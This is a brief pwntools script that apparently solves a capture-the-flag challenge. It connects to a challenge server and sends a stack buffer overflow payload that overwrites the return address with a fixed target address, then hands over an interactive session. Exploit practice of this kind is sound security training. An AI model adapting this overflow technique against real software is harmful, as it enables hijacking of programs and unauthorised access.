from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'

#p = process('./chal')
p = remote("chall.nckuctf.org", 28500)

addr = 0x40117e
OFFSET = 24

payload = b"A" * OFFSET + p64(addr)
p.sendlineafter(b"> ", payload)

p.interactive()
